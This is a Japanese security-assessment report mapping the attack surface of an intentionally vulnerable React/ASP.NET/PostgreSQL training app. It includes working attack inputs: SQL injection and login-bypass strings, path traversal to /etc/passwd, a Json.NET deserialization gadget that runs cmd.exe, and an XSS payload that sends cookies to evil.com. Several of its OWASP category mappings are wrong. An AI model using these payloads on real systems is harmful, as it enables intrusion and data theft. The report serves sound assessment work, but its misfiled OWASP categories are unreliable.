# アタックサーフェース定義レポート

> 実施日時: 2026年02月23日
> 前工程レポート: /docker-work-dir/docs/reports/01-情報収集.md

## 1. アタックサーフェースサマリー

### 概要図

```
[外部ネットワーク]
    |
    ├── :3000 (Frontend/Nginx) ──┐
    ├── :5000 (API/Kestrel)      │
    └── :15432 (PostgreSQL) ⚠️   │  [Docker Bridge: 172.26.0.0/16]
                                  │
        ┌─────────────────────────┘
        │
        ├── frontend:80 (Nginx) ─────→ api:5000 (APIプロキシ)
        │     ├── React SPA                │
        │     ├── XSS Attack Point         ├── SQLインジェクション脆弱性
        │     ├── Open Redirect            ├── 認証バイパス
        │     └── CSRF脆弱性               ├── Mass Assignment
        │                                  ├── ディレクトリトラバーサル
        │                                  ├── 安全でないデシリアライズ
        │                                  └── HTTPヘッダインジェクション
        │                                      |
        │                                      v
        └────────────────────────────→ db:5432 (PostgreSQL)
                                           ├── 平文パスワード
                                           ├── 弱い認証情報
                                           └── SSL/TLS未使用
```

### 攻撃面の統計

| カテゴリ | 項目数 |
|---------|--------|
| 公開ポート | 3 (うち1つは不要公開) |
| APIエンドポイント | 8 |
| 入力フォーム | 5 |
| 認証不要エンドポイント | 7 (DELETEを含む) |
| ハードコード秘匿情報 | 5 |
| SQLインジェクション箇所 | 6 |
| XSS攻撃ポイント | 1 |
| OWASP Top 10 該当カテゴリ | 10 (全カテゴリ) |

## 2. ネットワーク層

### 2.1 公開ポート一覧

| ポート | サービス | プロトコル | 必要性 | リスク | 詳細 |
|--------|---------|-----------|--------|-------|------|
| 3000 | Frontend (Nginx) | HTTP | ✓ 必要 | 中 | セキュリティヘッダ欠如、HTTPS未使用 |
| 5000 | API (Kestrel) | HTTP | ✓ 必要 | 高 | 複数の脆弱性、HTTPS未使用、CORS設定不備 |
| 15432 | PostgreSQL | PostgreSQL | ✗ **不要** | **🔴 Critical** | **データベースが外部公開（I-03）**<br/>・直接アクセス可能<br/>・弱いパスワード（postgres123）<br/>・SSL/TLS未使用 |

**リスク評価:**
- **Critical**: ポート15432の外部公開により、攻撃者はアプリケーション層を経由せずに直接データベースに接続可能
- **High**: すべての通信が平文HTTP（暗号化なし）

### 2.2 通信経路

#### 外部 → Frontend (port 3000)
- **プロトコル**: HTTP (平文)
- **サーバー**: nginx/1.29.5
- **セキュリティヘッダ**: なし
- **脆弱性**: 
  - HTTPS未使用
  - セキュリティヘッダ欠如（CSP, X-Frame-Options, HSTS等）

#### 外部 → API (port 5000)
- **プロトコル**: HTTP (平文)
- **サーバー**: Kestrel (ASP.NET Core 10.0 Preview)
- **認証**: なし
- **CORS**: AllowAnyOrigin() - すべてのオリジンを許可
- **脆弱性**:
  - HTTPS未使用
  - 認証・認可機構の欠如
  - レート制限なし

#### Frontend → API (内部プロキシ)
- **経路**: `http://frontend:80/api/*` → `http://api:5000/api/*`
- **プロキシ**: Nginx reverse proxy
- **脆弱性**: 内部通信も平文HTTP

#### API → Database (内部)
- **接続文字列**: `Host=db;Port=5432;Database=vulndb;Username=postgres;Password=postgres123;SSL Mode=Disable`
- **プロトコル**: PostgreSQL (平文)
- **認証**: 
  - ユーザー: postgres
  - パスワード: postgres123 (弱い)
- **脆弱性**:
  - SSL/TLS未使用（D-03）
  - 認証情報ハードコード（I-02）

#### 外部 → Database (port 15432) ⚠️
- **危険**: 外部から直接アクセス可能
- **攻撃シナリオ**:
  ```bash
  psql -h localhost -p 15432 -U postgres -d vulndb
  # パスワード: postgres123
  ```

## 3. アプリケーション層

### 3.1 フロントエンド攻撃面

#### 3.1.1 技術スタック
- **フレームワーク**: React 19.2.0
- **ビルドツール**: Vite 7.2.4
- **ルーティング**: React Router 7.13.0
- **Webサーバー**: Nginx 1.29.5 (Alpine)

#### 3.1.2 ページ・ルート一覧

| ページ | パス | 入力フィールド | 脆弱性 |
|--------|------|---------------|-------|
| ユーザー一覧 | `/` | 検索ボックス | F-03: Open Redirect |
| ユーザー詳細 | `/users/:id` | - | F-01: XSS (profileImageUrl) |
| ユーザー追加 | `/users/new` | username, email, password, role | F-04: CSRF, F-05: パスワードログ |
| ユーザー編集 | `/users/:id/edit` | username, email, password, role | F-04: CSRF, F-05: パスワードログ |
| ログイン | `/login` | username, password | F-04: CSRF, F-05: 認証情報ログ、localStorage保存 |

#### 3.1.3 脆弱なコード箇所

**F-01: XSS (Stored XSS via dangerouslySetInnerHTML)**
- **ファイル**: `/workdir/src/frontend/src/pages/UserDetail.tsx` (行43)
- **コード**:
  ```tsx
  <td dangerouslySetInnerHTML={{ __html: user.profileImageUrl || '<em>未設定</em>' }} />
  ```
- **攻撃ベクトル**: `profileImageUrl` フィールドに `<script>alert(document.cookie)</script>` を注入
- **影響**: セッションハイジャック、情報窃取

**F-02: 秘匿情報のハードコード**
- **ファイル**: `/workdir/src/frontend/src/config.ts` (行3-4)
- **コード**:
  ```typescript
  export const INTERNAL_API_KEY = 'sk-vuln-app-secret-key-12345';
  export const ADMIN_PANEL_URL = 'http://internal-admin.local:8080';
  ```
- **影響**: APIキーと内部URLがクライアントサイドに露出

**F-03: Open Redirect**
- **ファイル**: `/workdir/src/frontend/src/pages/UserList.tsx` (行12-17)
- **コード**:
  ```typescript
  const redirect = params.get('redirect');
  if (redirect) {
    window.location.href = redirect;
  }
  ```
- **攻撃ベクトル**: `/?redirect=https://evil.com` でフィッシングサイトへ誘導

**F-04: CSRF対策の欠如**
- **ファイル**: `/workdir/src/frontend/src/api.ts` (行5)
- **コード**:
  ```typescript
  const headers = { 'Content-Type': 'application/json' };
  // CSRFトークンなし
  ```
- **影響**: すべてのAPIリクエストがCSRF攻撃可能

**F-05: 機密情報のログ出力**
- **ファイル**: `/workdir/src/frontend/src/api.ts` (行54-55, 27)
- **コード**:
  ```typescript
  debugLog('login attempt', { username, password }); // パスワードをログ出力
  debugLog('createUser request', user); // パスワードを含む
  ```
- **ファイル**: `/workdir/src/frontend/src/pages/Login.tsx` (行16)
- **コード**:
  ```typescript
  localStorage.setItem('user', JSON.stringify(result.user)); // 平文でパスワード含む
  ```

#### 3.1.4 クライアントサイドセキュリティ

**セキュリティヘッダの欠如 (Nginx)**
- ❌ `Content-Security-Policy`: 未設定
- ❌ `X-Frame-Options`: 未設定
- ❌ `X-Content-Type-Options`: 未設定
- ❌ `Strict-Transport-Security`: 未設定
- ❌ `Referrer-Policy`: 未設定

### 3.2 WebAPI攻撃面

#### 3.2.1 エンドポイント一覧

| # | メソッド | パス | 認証 | 入力検証 | SQLパラメータ化 | 脆弱性 | リスク |
|---|---------|------|------|---------|----------------|-------|-------|
| 1 | GET | `/api/users` | ❌ なし | ❌ なし | ❌ 文字列連結 | A-01: SQLインジェクション | 🔴 Critical |
| 2 | GET | `/api/users/{id}` | ❌ なし | ❌ なし | ❌ 文字列連結 | A-01: SQLインジェクション | 🔴 Critical |
| 3 | POST | `/api/users` | ❌ なし | ❌ なし | ❌ 文字列連結 | A-01, A-03, A-06 | 🔴 Critical |
| 4 | PUT | `/api/users/{id}` | ❌ なし | ❌ なし | ❌ 文字列連結 | A-01, A-03, A-06 | 🔴 Critical |
| 5 | DELETE | `/api/users/{id}` | ❌ なし | ❌ なし | - | A-02: 認証バイパス | 🔴 Critical |
| 6 | POST | `/api/login` | N/A | ❌ なし | ❌ 文字列連結 | A-01, A-03, A-08, A-09 | 🔴 Critical |
| 7 | GET | `/api/files/{*filePath}` | ❌ なし | ❌ なし | - | A-07: Path Traversal | 🔴 Critical |
| 8 | POST | `/api/import` | ❌ なし | ❌ なし | - | A-10: Unsafe Deserialization | 🔴 Critical |

#### 3.2.2 脆弱なコード箇所

**A-01: SQLインジェクション（複数箇所）**

*箇所1: `/api/users?search=xxx`*
- **ファイル**: `/workdir/src/api/VulnApi/Controllers/UsersController.cs` (行38-40)
- **コード**:
  ```csharp
  if (!string.IsNullOrEmpty(search))
  {
      sql += $" WHERE username LIKE '%{search}%' OR email LIKE '%{search}%'";
  }
  ```
- **攻撃例**:
  ```
  GET /api/users?search=test' OR '1'='1
  GET /api/users?search=test'; DROP TABLE users; --
  ```

*箇所2: `/api/users/{id}`*
- **ファイル**: `/workdir/src/api/VulnApi/Controllers/UsersController.cs` (行73)
- **コード**:
  ```csharp
  var sql = $"SELECT ... FROM users WHERE id = {id}";
  ```

*箇所3: POST `/api/users`*
- **ファイル**: `/workdir/src/api/VulnApi/Controllers/UsersController.cs` (行104-106)
- **コード**:
  ```csharp
  var sql = $@"INSERT INTO users (username, email, password, role, profile_image_url)
               VALUES ('{user.Username}', '{user.Email}', '{user.Password}', '{user.Role}', '{user.ProfileImageUrl}')";
  ```

*箇所4: PUT `/api/users/{id}`*
- **ファイル**: `/workdir/src/api/VulnApi/Controllers/UsersController.cs` (行136-144)
- **コード**:
  ```csharp
  var sql = $@"UPDATE users SET
                  username = '{user.Username}',
                  email = '{user.Email}',
                  password = '{user.Password}',
                  role = '{user.Role}', ...";
  ```

*箇所5: POST `/api/login`*
- **ファイル**: `/workdir/src/api/VulnApi/Controllers/AuthController.cs` (行40)
- **コード**:
  ```csharp
  var sql = $"SELECT ... FROM users WHERE username = '{request.Username}' AND password = '{request.Password}'";
  ```
- **認証バイパス攻撃例**:
  ```json
  {
    "username": "admin' --",
    "password": "anything"
  }
  ```

**A-02: 認証バイパス**
- **ファイル**: `/workdir/src/api/VulnApi/Controllers/UsersController.cs` (行166-187)
- **問題**: DELETE操作に認証チェックが存在しない
- **影響**: 誰でも任意のユーザーを削除可能

**A-03: パスワード平文保存・露出**
- **データベース**: `/workdir/src/db/init.sql` (行8) - パスワードカラムが平文
- **APIレスポンス**: `/workdir/src/api/VulnApi/Controllers/UsersController.cs` - パスワードがレスポンスに含まれる
- **モデル**: `/workdir/src/api/VulnApi/Models/User.cs` (行12)
- **影響**: データベース侵害時に全パスワードが露出

**A-04: 詳細エラー情報の露出**
- **ファイル**: `/workdir/src/api/VulnApi/Program.cs` (行28)
- **コード**:
  ```csharp
  app.UseDeveloperExceptionPage();
  ```
- **ファイル**: `/workdir/src/api/VulnApi/Controllers/UsersController.cs` (行57)
- **コード**:
  ```csharp
  return StatusCode(500, new { error = ex.Message, stackTrace = ex.StackTrace });
  ```
- **影響**: スタックトレース、DB構造、内部パスが露出

**A-05: CORS設定の不備**
- **ファイル**: `/workdir/src/api/VulnApi/Program.cs` (行10-18)
- **コード**:
  ```csharp
  policy.AllowAnyOrigin()
        .AllowAnyMethod()
        .AllowAnyHeader();
  ```
- **影響**: すべてのオリジンからのリクエストを許可、CSRF攻撃が容易

**A-06: Mass Assignment**
- **ファイル**: `/workdir/src/api/VulnApi/Models/User.cs` (行14)
- **問題**: `Role` プロパティがリクエストから直接バインド可能
- **攻撃例**:
  ```json
  POST /api/users
  {
    "username": "attacker",
    "email": "attacker@evil.com",
    "password": "pass",
    "role": "admin"  // 一般ユーザーが管理者権限を取得
  }
  ```

**A-07: ディレクトリトラバーサル**
- **ファイル**: `/workdir/src/api/VulnApi/Controllers/FileController.cs` (行26-38)
- **コード**:
  ```csharp
  var fullPath = Path.Combine("/app/uploads", filePath);
  // パス検証なし
  var bytes = System.IO.File.ReadAllBytes(fullPath);
  ```
- **攻撃例**:
  ```
  GET /api/files/../../../etc/passwd
  GET /api/files/../appsettings.json
  ```

**A-08: HTTPヘッダインジェクション**
- **ファイル**: `/workdir/src/api/VulnApi/Controllers/AuthController.cs` (行59-60)
- **コード**:
  ```csharp
  Response.Headers.Append("X-User-Role", user.Role);
  Response.Headers.Append("X-Username", user.Username);
  ```
- **攻撃例**: ユーザー名に改行文字を含めてヘッダを注入

**A-09: レート制限の欠如**
- **対象**: すべてのエンドポイント（特に `/api/login`）
- **影響**: ブルートフォース攻撃が無制限に実行可能

**A-10: 安全でないデシリアライズ**
- **ファイル**: `/workdir/src/api/VulnApi/Controllers/FileController.cs` (行50-61)
- **コード**:
  ```csharp
  var settings = new JsonSerializerSettings
  {
      TypeNameHandling = TypeNameHandling.All  // 危険な設定
  };
  var result = JsonConvert.DeserializeObject(json, settings);
  ```
- **影響**: 任意のコード実行（RCE）が可能

#### 3.2.3 API設定ファイル

**appsettings.json**
- **ファイル**: `/workdir/src/api/VulnApi/appsettings.json`
- **問題**:
  - `AllowedHosts: "*"` - すべてのホストを許可
  - 接続文字列にパスワード直書き

**Program.cs**
- **ファイル**: `/workdir/src/api/VulnApi/Program.cs`
- **問題**:
  - 開発者例外ページの無条件有効化
  - CORS AllowAnyOrigin
  - 認証・認可ミドルウェアなし

### 3.3 データベース攻撃面

#### 3.3.1 スキーマ定義

**テーブル: users**
- **ファイル**: `/workdir/src/db/init.sql`
- **構造**:
  ```sql
  CREATE TABLE users (
      id SERIAL PRIMARY KEY,
      username VARCHAR(100) NOT NULL,
      email VARCHAR(255) NOT NULL,
      password VARCHAR(255) NOT NULL,  -- ⚠️ 平文パスワード (D-04)
      role VARCHAR(50) NOT NULL DEFAULT 'user',
      profile_image_url TEXT DEFAULT '',
      created_at TIMESTAMP DEFAULT NOW(),
      updated_at TIMESTAMP DEFAULT NOW()
  );
  ```

**脆弱性**:
- パスワード暗号化なし（D-04）
- ユニーク制約なし（username, email の重複可能）
- インデックス不足

#### 3.3.2 初期データ

**ファイル**: `/workdir/src/db/seed.sql`

| Username | Email | Password | Role | 問題 |
|----------|-------|----------|------|------|
| admin | admin@example.com | admin123 | admin | 弱いパスワード |
| tanaka | tanaka@example.com | password | user | 一般的すぎる |
| suzuki | suzuki@example.com | 123456 | user | 最弱パスワード |
| sato | sato@example.com | qwerty | user | 辞書攻撃可能 |
| yamada | yamada@example.com | letmein | user | 辞書攻撃可能 |

**すべてのパスワードが平文で、極めて弱い**

#### 3.3.3 データベース接続設定

**接続文字列**: `Host=db;Port=5432;Database=vulndb;Username=postgres;Password=postgres123;SSL Mode=Disable`

**脆弱性**:
- **D-01**: 弱いパスワード（postgres123）
- **D-03**: SSL/TLS未使用
- **I-02**: 認証情報のハードコード（docker-compose.yml, appsettings.json）
- **I-03**: DBポート15432が外部公開

#### 3.3.4 データベース権限

- **ユーザー**: postgres (スーパーユーザー)
- **問題**: アプリケーションが不要な高権限で動作
  - テーブル削除可能
  - ユーザー作成可能
  - 設定変更可能

## 4. インフラ層

### 4.1 Docker Compose設定

**ファイル**: `/workdir/docker-compose.yml`

#### 4.1.1 環境変数の問題

| サービス | 環境変数 | 値 | 脆弱性 |
|---------|---------|-----|--------|
| db | POSTGRES_PASSWORD | postgres123 | I-02: ハードコード、D-01: 弱い |
| api | ConnectionStrings__DefaultConnection | パスワード含む | I-02: ハードコード |
| api | ASPNETCORE_ENVIRONMENT | Development | A-04: 本番で開発モード |

#### 4.1.2 ポートマッピング

```yaml
db:
  ports:
    - "15432:5432"  # ⚠️ I-03: DBポートの外部公開
```

**問題**: データベースポートが外部に公開され、直接攻撃可能

#### 4.1.3 ネットワーク設定

- **タイプ**: bridge (デフォルト)
- **サブネット**: 172.26.0.0/16
- **問題**: ネットワーク分離なし（全サービスが同一ネットワーク）

### 4.2 Dockerfile分析

#### 4.2.1 API Dockerfile

**ファイル**: `/workdir/src/api/Dockerfile`

**脆弱性 I-01: rootユーザー実行**
```dockerfile
FROM mcr.microsoft.com/dotnet/aspnet:10.0-preview
# USERディレクティブなし → rootで実行
WORKDIR /app
...
ENTRYPOINT ["dotnet", "VulnApi.dll"]
```

**問題**:
- コンテナがroot権限で実行
- コンテナエスケープ時の影響大
- ベストプラクティス違反

#### 4.2.2 Frontend Dockerfile

**ファイル**: `/workdir/src/frontend/Dockerfile`

**脆弱性 I-01: rootユーザー実行**
```dockerfile
FROM nginx:alpine
# USERディレクティブなし → rootで実行
COPY --from=build /app/dist /usr/share/nginx/html
...
CMD ["nginx", "-g", "daemon off;"]
```

**問題**: 同上

### 4.3 セキュリティ制御の欠如

| 制御項目 | 状態 | 影響 |
|---------|------|------|
| コンテナユーザー権限 | ❌ root実行 | 高 |
| ネットワーク分離 | ❌ なし | 中 |
| secrets管理 | ❌ ハードコード | 高 |
| ボリュームマウント | ⚠️ 一部読み取り専用 | 低 |
| リソース制限 | ❌ なし | 中 |
| ヘルスチェック | ✅ あり | - |
| 読み取り専用ルートFS | ❌ なし | 中 |
| Capabilities | ❌ 制限なし | 中 |

### 4.4 依存パッケージ

#### 4.4.1 Frontend Dependencies

**ファイル**: `/workdir/src/frontend/package.json`

```json
{
  "react": "^19.2.0",
  "react-dom": "^19.2.0",
  "react-router-dom": "^7.13.0",
  "vite": "^7.2.4",
  "typescript": "~5.9.3"
}
```

**脆弱性 A-06**: 既知の脆弱性チェックが必要（npm audit未実施）

#### 4.4.2 API Dependencies

**ファイル**: `/workdir/src/api/VulnApi/VulnApi.csproj`

```xml
<PackageReference Include="Microsoft.AspNetCore.OpenApi" Version="10.0.0-preview.7.25380.108" />
<PackageReference Include="Newtonsoft.Json" Version="13.0.3" />
<PackageReference Include="Npgsql" Version="9.0.3" />
```

**注意点**:
- .NET 10.0 Preview使用（本番非推奨）
- Newtonsoft.Json: TypeNameHandling.All使用によるRCEリスク

## 5. OWASP Top 10 (2021) マッピング

| # | カテゴリ | 該当箇所 | リスク | 詳細 |
|---|---------|---------|--------|------|
| **A01** | **Broken Access Control** | `/api/users` (全エンドポイント)<br/>`DELETE /api/users/{id}` | 🔴 Critical | ・認証機構なし<br/>・認可チェックなし<br/>・誰でもユーザー削除可能<br/>・Mass Assignment (roleフィールド) |
| **A02** | **Cryptographic Failures** | Database接続<br/>HTTPプロトコル<br/>パスワード保存 | 🔴 Critical | ・SSL/TLS未使用（DB接続）<br/>・HTTPS未使用（全通信）<br/>・パスワード平文保存<br/>・DBポート外部公開 |
| **A03** | **Injection** | `GET /api/users?search=`<br/>`POST /api/login`<br/>全SQLクエリ | 🔴 Critical | ・SQLインジェクション（6箇所）<br/>・パラメータ化クエリ未使用<br/>・入力検証なし |
| **A04** | **Insecure Design** | API全体<br/>認証フロー<br/>エラーハンドリング | 🔴 Critical | ・認証設計の欠如<br/>・開発者例外ページ有効<br/>・スタックトレース露出<br/>・セキュリティ要件の欠如 |
| **A05** | **Security Misconfiguration** | CORS設定<br/>Nginx設定<br/>Docker設定 | 🟠 High | ・CORS AllowAnyOrigin<br/>・セキュリティヘッダなし<br/>・開発環境設定のまま<br/>・DBポート公開<br/>・root実行 |
| **A06** | **Vulnerable Components** | `User.Role`<br/>依存パッケージ | 🟠 High | ・Mass Assignment脆弱性<br/>・.NET 10 Preview使用<br/>・脆弱性スキャン未実施 |
| **A07** | **Identification and Authentication Failures** | `/api/login`<br/>全エンドポイント | 🔴 Critical | ・認証機構なし<br/>・パスワード平文比較<br/>・セッション管理なし<br/>・MFA未実装<br/>・レート制限なし |
| **A08** | **Software and Data Integrity Failures** | `X-User-Role`ヘッダ<br/>`localStorage` | 🟠 High | ・HTTPヘッダインジェクション<br/>・クライアント側に認証情報保存<br/>・署名・検証なし |
| **A09** | **Security Logging and Monitoring Failures** | 全エンドポイント<br/>ログイン機能 | 🟠 High | ・セキュリティログなし<br/>・監査証跡なし<br/>・レート制限なし<br/>・アラート機構なし |
| **A10** | **Server-Side Request Forgery (SSRF)** | `/api/files/{*filePath}`<br/>`/api/import` | 🔴 Critical | ・ディレクトリトラバーサル<br/>・安全でないデシリアライズ<br/>・ファイルパス検証なし |

**カバレッジ**: OWASP Top 10 全カテゴリに該当 (10/10)

## 6. 優先度付き攻撃面一覧

| # | 攻撃面 | カテゴリ | 推定リスク | 検証優先度 | 攻撃難易度 | 影響範囲 |
|---|--------|---------|-----------|-----------|-----------|---------|
| 1 | **SQLインジェクション** (`/api/users?search=`) | A03 | 🔴 Critical | **P0** | 低 | データベース全体 |
| 2 | **データベースポート外部公開** (15432) | A02 | 🔴 Critical | **P0** | 低 | データベース全体 |
| 3 | **認証バイパス** (`DELETE /api/users/{id}`) | A01 | 🔴 Critical | **P0** | 低 | 全ユーザーデータ |
| 4 | **パスワード平文保存・露出** | A02 | 🔴 Critical | **P0** | - | 全ユーザー認証情報 |
| 5 | **SQLインジェクション** (`POST /api/login`) | A03 | 🔴 Critical | **P0** | 低 | 認証バイパス |
| 6 | **安全でないデシリアライズ** (`POST /api/import`) | A10 | 🔴 Critical | **P1** | 中 | RCE（サーバー乗っ取り） |
| 7 | **ディレクトリトラバーサル** (`GET /api/files/`) | A10 | 🔴 Critical | **P1** | 低 | ファイルシステム全体 |
| 8 | **Mass Assignment** (`POST /api/users`) | A06 | 🔴 Critical | **P1** | 低 | 権限昇格 |
| 9 | **XSS** (`profileImageUrl`) | A03 | 🟠 High | **P1** | 低 | セッションハイジャック |
| 10 | **認証情報ハードコード** (docker-compose.yml) | A05 | 🟠 High | **P1** | - | 認証情報露出 |
| 11 | **レート制限なし** (`/api/login`) | A09 | 🟠 High | **P2** | 低 | ブルートフォース |
| 12 | **CORS設定不備** (AllowAnyOrigin) | A05 | 🟠 High | **P2** | 中 | CSRF攻撃 |
| 13 | **HTTPヘッダインジェクション** (`X-Username`) | A08 | 🟠 High | **P2** | 中 | レスポンス分割 |
| 14 | **詳細エラー露出** (スタックトレース) | A04 | 🟠 High | **P2** | - | 情報漏洩 |
| 15 | **Open Redirect** (`?redirect=`) | A01 | 🟡 Medium | **P3** | 低 | フィッシング |
| 16 | **秘匿情報のログ出力** (console.log) | A09 | 🟡 Medium | **P3** | - | 情報漏洩 |
| 17 | **root実行** (全コンテナ) | A05 | 🟡 Medium | **P3** | - | 権限昇格（コンテナエスケープ時） |

### 優先度定義

- **P0 (最優先)**: 即座に悪用可能、Critical影響、認証不要
- **P1 (高優先)**: 悪用可能、High影響、攻撃難易度低〜中
- **P2 (中優先)**: 悪用可能、Medium〜High影響、攻撃難易度中
- **P3 (低優先)**: 影響限定的、または前提条件が必要

## 7. 攻撃チェーン分析

### 7.1 最短攻撃パス（認証なしでDB全権取得）

```
攻撃者
  ↓
[1] ポート15432に直接接続
  ↓
psql -h localhost -p 15432 -U postgres
(パスワード: postgres123)
  ↓
[2] データベース全権取得
  ↓
SELECT * FROM users; -- 全ユーザー情報（平文パスワード含む）取得
DROP TABLE users;    -- テーブル削除
  ↓
完全侵害
```

**所要時間**: 1分未満  
**必要スキル**: PostgreSQLの基本知識のみ

### 7.2 SQLインジェクション経由の攻撃パス

```
攻撃者
  ↓
[1] SQLインジェクション実行
GET /api/users?search=test' UNION SELECT id, username, email, password, role, '', now(), now() FROM users WHERE '1'='1
  ↓
[2] 全ユーザー情報取得（パスワード平文）
  ↓
[3] 管理者アカウントでログイン
POST /api/login
{"username": "admin", "password": "admin123"}
  ↓
[4] 新規管理者アカウント作成（Mass Assignment）
POST /api/users
{"username": "backdoor", "email": "backdoor@evil.com", "password": "secret", "role": "admin"}
  ↓
永続的バックドア確立
```

### 7.3 RCE（リモートコード実行）パス

```
攻撃者
  ↓
[1] 安全でないデシリアライズ攻撃
POST /api/import
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System"
  },
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd.exe", "/c calc.exe"]
  }
}
  ↓
[2] サーバー上で任意コード実行
  ↓
[3] リバースシェル確立
  ↓
完全なサーバー制御
```

### 7.4 フロントエンド経由の攻撃パス

```
攻撃者
  ↓
[1] XSSペイロード注入
POST /api/users
{"username": "attacker", "email": "a@b.c", "password": "pass", "role": "user",
 "profileImageUrl": "<script>fetch('https://evil.com?cookie='+document.cookie)</script>"}
  ↓
[2] 管理者がユーザー詳細ページを閲覧
  ↓
[3] XSS実行 → セッション情報窃取
  ↓
[4] 管理者セッションでAPIを操作
  ↓
権限昇格・データ窃取
```

## 8. まとめ

### 8.1 重大な発見事項

1. **データベース直接アクセス可能** (I-03)
   - ポート15432が外部公開
   - 弱い認証情報（postgres/postgres123）
   - SSL/TLS未使用

2. **全エンドポイントに認証なし** (A01, A07)
   - CRUD操作に認証チェックなし
   - 削除操作すら無制限

3. **SQLインジェクション脆弱性が全域に存在** (A03)
   - 6箇所のエンドポイントで確認
   - パラメータ化クエリ未使用
   - 即座に悪用可能

4. **パスワード平文保存・露出** (A02)
   - データベースに平文保存
   - APIレスポンスに含まれる
   - 初期パスワードが極めて弱い

5. **RCE脆弱性** (A10)
   - 安全でないデシリアライズ
   - ディレクトリトラバーサル

### 8.2 防御の完全欠如

- 認証機構: **なし**
- 認可機構: **なし**
- 入力検証: **なし**
- 出力エンコーディング: **不十分**
- レート制限: **なし**
- セキュリティログ: **なし**
- HTTPS: **なし**
- CSRF対策: **なし**

### 8.3 次フェーズへの推奨事項

**脆弱性スキャンフェーズ**で実施すべき項目:

1. **自動化スキャン**
   - SQLインジェクション全パターン検証
   - XSSペイロード自動注入
   - ディレクトリトラバーサル自動探索
   - OWASP ZAPによる網羅的スキャン

2. **手動検証**
   - デシリアライズRCE PoCの作成
   - Mass Assignmentによる権限昇格
   - 認証バイパスの実証
   - データベース直接接続テスト

3. **影響範囲の定量化**
   - 各脆弱性のCVSS v3.1スコアリング
   - 実際のデータ抽出量の測定
   - 攻撃所要時間の計測

---

**アタックサーフェース定義完了**

- **総攻撃面数**: 17
- **Critical脆弱性**: 8
- **High脆弱性**: 6
- **Medium脆弱性**: 3
- **OWASP Top 10カバレッジ**: 10/10 (100%)

このアプリケーションは**意図的に脆弱性を含む診断用サンプル**として設計されており、本番環境での使用は絶対に避けるべきです。
